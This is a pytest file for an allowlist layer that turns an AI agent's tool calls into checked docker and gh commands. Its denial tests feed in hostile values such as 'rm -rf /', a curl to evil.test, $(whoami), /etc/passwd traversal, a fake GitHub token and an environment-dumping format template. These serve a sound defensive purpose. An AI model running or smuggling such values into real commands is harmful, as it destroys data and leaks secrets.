"""Tool invocation boundary: tool name + named arguments -> verified argv."""

from __future__ import annotations

from pathlib import Path

import pytest

from citadel.policy import load_catalog
from citadel.tools import CommandDenied, build_argv, load_allowlist


def test_read_logs_builds_the_container_logs_command() -> None:
    """`docker logs`, not `docker compose logs`: the sandbox has no compose project."""
    argv, command = build_argv("read_logs", {"service": "checkout-api"})
    assert argv == ["docker", "logs", "citadel-checkout-api-1"]
    assert command.id == "docker.logs"
    assert command.tier == "T0"


def test_restart_service_builds_the_restart_command() -> None:
    argv, command = build_argv("restart_service", {"service": "checkout-api"})
    assert argv == ["docker", "restart", "citadel-checkout-api-1"]
    assert command.tier == "T1"


def test_flag_parameters_are_rendered_in_flag_value_form() -> None:
    argv, _ = build_argv("get_pr_status", {"repo": "acme/infra"})
    assert argv == ["gh", "pr", "list", "--repo", "acme/infra"]


def test_tools_without_a_command_cannot_execute() -> None:
    for tool in ("search_code",):
        with pytest.raises(CommandDenied, match="no allowlisted command"):
            build_argv(tool, {})


def test_open_remediation_pr_builds_a_draft_pr_from_a_branch() -> None:
    argv, command = build_argv(
        "open_remediation_pr",
        {
            "repo": "acme/infra",
            "base": "main",
            "head": "fix/oom-restart",
            "title": "Restart checkout-api on OOM",
            "body": "Adds a restart policy so the container recovers on its own",
        },
        body_path=BODY,
    )
    assert argv == [
        "gh",
        "pr",
        "create",
        "--draft",
        "--repo",
        "acme/infra",
        "--base",
        "main",
        "--head",
        "fix/oom-restart",
        "--title",
        "Restart checkout-api on OOM",
        "--body-file",
        str(BODY),
    ]
    assert command.tier == "T1"


@pytest.mark.parametrize("missing", ["repo", "base", "head", "title", "body"])
def test_open_remediation_pr_requires_every_argument(missing: str) -> None:
    """No default branch, no checkout and no inferred text: all are explicit."""
    args = {
        "repo": "acme/infra",
        "base": "main",
        "head": "fix/oom-restart",
        "title": "Restart checkout-api on OOM",
        "body": "Adds a restart policy so the container recovers on its own",
    }
    args.pop(missing)
    with pytest.raises(CommandDenied, match="requires argument"):
        build_argv("open_remediation_pr", args)


@pytest.mark.parametrize(
    "value",
    ["Restart; rm -rf /", "a && b", "$(id)", "`id`", "a|b", "line\nbreak", "   "],
)
def test_pr_text_rejects_metacharacters_and_multiline(value: str) -> None:
    """A title or body is prose, but never a second command."""
    args = {
        "repo": "acme/infra",
        "base": "main",
        "head": "fix/oom",
        "title": value,
        "body": "fine",
    }
    with pytest.raises(CommandDenied):
        build_argv("open_remediation_pr", args)


def test_unknown_tool_is_denied() -> None:
    with pytest.raises(CommandDenied, match="not in the catalog"):
        build_argv("exfiltrate_secrets", {})


def test_t2_tool_never_executes() -> None:
    with pytest.raises(CommandDenied):
        build_argv("delete_volume", {})


def test_required_argument_is_enforced() -> None:
    with pytest.raises(CommandDenied, match="requires argument"):
        build_argv("restart_service", {})


def test_extra_arguments_are_rejected() -> None:
    """The model cannot smuggle extra flags through the argument map."""
    with pytest.raises(CommandDenied, match="unexpected arguments"):
        build_argv("read_logs", {"service": "checkout-api", "extra": "--privileged"})


@pytest.mark.parametrize(
    "value",
    [
        "checkout-api; rm -rf /",
        "checkout-api && curl evil.test",
        "$(whoami)",
        "`id`",
        "a|b",
        "/etc/passwd",
        "..",
        "with space",
        "",
    ],
)
def test_malformed_argument_values_are_denied(value: str) -> None:
    with pytest.raises(CommandDenied):
        build_argv("read_logs", {"service": value})


def test_overlong_argument_is_denied() -> None:
    with pytest.raises(CommandDenied, match="exceeds"):
        build_argv("read_logs", {"service": "a" * 100})


def test_non_string_argument_is_denied() -> None:
    with pytest.raises(CommandDenied, match="must be a string"):
        build_argv("read_logs", {"service": 123})


def test_every_registered_command_is_allowlisted() -> None:
    ids = {entry.id for entry in load_allowlist()}
    for name, spec in load_catalog().items():
        if spec.command is not None:
            assert spec.command in ids, f"{name} points at unknown command {spec.command}"


def test_a_secret_disclosing_command_is_only_wired_with_pinned_arguments() -> None:
    """The caveat is enforced, not just documented.

    docker inspect and docker compose config disclose secrets by design. A tool
    may point at them only if its catalog entry pins the flag that decides how
    much is printed, because the caller cannot supply arguments the catalog does
    not declare.
    """
    risky = {c.id for c in load_allowlist() if c.content_risk == "definitive"}
    assert risky == {"docker.inspect", "docker.compose.config"}

    wired = {name: spec for name, spec in load_catalog().items() if spec.command in risky}
    assert wired, "the two commands are registered; this test is about how"
    for name, spec in wired.items():
        assert spec.args, f"{name} is wired to a secret-disclosing command with nothing pinned"
        assert spec.tier == "T0", f"{name} is a read, so it should be T0"

    # And the two commands are not merely present: they are the ones pinned.
    assert "--format" in load_catalog()["inspect_container"].args
    assert "--no-interpolate" in load_catalog()["compose_config"].args


def test_inspect_container_pins_a_format_that_cannot_print_the_environment() -> None:
    argv, command = build_argv("inspect_container", {"container": "citadel-checkout-api-1"})

    assert argv[:3] == ["docker", "inspect", "--format"]
    template = argv[3]
    assert ".Config.Env" not in template, "the pinned template must not select the environment"
    assert "RestartCount" in template
    assert argv[-1] == "citadel-checkout-api-1"
    assert command.content_risk == "definitive"


def test_the_caller_cannot_supply_the_pinned_format() -> None:
    """Pinned means unreachable: an extra argument is an unknown argument."""
    with pytest.raises(CommandDenied, match="unexpected arguments"):
        build_argv(
            "inspect_container",
            {"container": "citadel-checkout-api-1", "format": "{{json .Config.Env}}"},
        )


def test_compose_config_pins_no_interpolate() -> None:
    argv, _ = build_argv("compose_config", {})

    assert argv == ["docker", "compose", "config", "--no-interpolate", "--quiet"]


def test_pr_diff_builds_a_bounded_diff_command() -> None:
    argv, command = build_argv("pr_diff", {"repo": "glaborie/citadel", "number": "30"})

    assert argv == ["gh", "pr", "diff", "--repo", "glaborie/citadel", "30"]
    assert command.content_risk == "possible"


def test_pr_diff_refuses_a_second_positional() -> None:
    """One PR number, no path arguments: the allowlist counts positional tokens."""
    with pytest.raises(CommandDenied):
        build_argv("pr_diff", {"repo": "glaborie/citadel", "number": "30", "extra": "x"})


def test_allowlist_marks_output_risk_for_documented_commands() -> None:
    risk = {c.id: c.content_risk for c in load_allowlist()}
    assert risk["docker.inspect"] == "definitive"
    assert risk["docker.compose.config"] == "definitive"
    assert risk["docker.logs"] == "possible"
    assert risk["docker.ps"] is None


BODY = Path("/tmp/citadel-pr-text/0123456789abcdef.txt")


def _pr(title: str) -> dict[str, str]:
    return {
        "repo": "acme/infra",
        "base": "main",
        "head": "fix/oom",
        "title": title,
        "body": "fine",
    }


def test_a_refused_token_is_not_quoted_back() -> None:
    """The 403 body is read by the caller, the logs and the transcript.

    Prose arguments skip the value pattern that names an argument and stops there,
    so they reach the allowlist matcher - which quoted the offending token with
    `!r`. A `ghp_` in a PR title therefore came back verbatim, from a path that
    runs before the DLP gate.
    """
    secret = "ghp_" + "A1b2" * 8
    with pytest.raises(CommandDenied) as caught:
        build_argv("open_remediation_pr", _pr(f"rotate {secret}; now"), body_path=BODY)

    message = str(caught.value)
    assert secret not in message
    assert "shell metacharacter in argument" in message


def test_a_refused_path_names_the_position() -> None:
    """Position plus class is actionable; the value is not."""
    with pytest.raises(CommandDenied, match=r"path traversal or absolute path in argument \d+"):
        build_argv("open_remediation_pr", _pr("update ../../etc/passwd"), body_path=BODY)


def test_the_position_is_the_argv_index() -> None:
    """So a reader can map it back to the argument without seeing the value."""
    with pytest.raises(CommandDenied) as caught:
        build_argv("open_remediation_pr", _pr("a|b"), body_path=BODY)
    index = int(str(caught.value).rsplit(" ", 1)[-1])
    assert index >= 2


def test_a_body_is_refused_until_the_operator_writes_it() -> None:
    """No file, no argv: a body is never rendered straight onto the command line."""
    with pytest.raises(CommandDenied, match="written to a file first"):
        build_argv("open_remediation_pr", _pr("Restart checkout-api on OOM"))


def test_a_caller_cannot_name_the_body_file() -> None:
    """The path is the operator's; a caller that offers one is refused as unknown."""
    for injected in ({"--body-file": "/etc/passwd"}, {"body_file": "/etc/passwd"}):
        with pytest.raises(CommandDenied, match="unexpected arguments"):
            build_argv(
                "open_remediation_pr",
                {**_pr("Restart checkout-api on OOM"), **injected},
                body_path=BODY,
            )


def test_a_body_never_reaches_argv_so_its_text_is_not_restricted() -> None:
    """Newlines, an ellipsis and a version range are what a body is made of."""
    body = "Fixes 0.1..0.2\n\n- one\n- two\n\n```\ngh pr diff\n```"
    argv, _ = build_argv(
        "open_remediation_pr",
        {**_pr("Restart checkout-api on OOM"), "body": body},
        body_path=BODY,
    )

    joined = " ".join(argv)
    assert "--body-file" in argv
    assert str(BODY) in argv
    for fragment in ("0.1..0.2", "```"):
        assert fragment not in joined
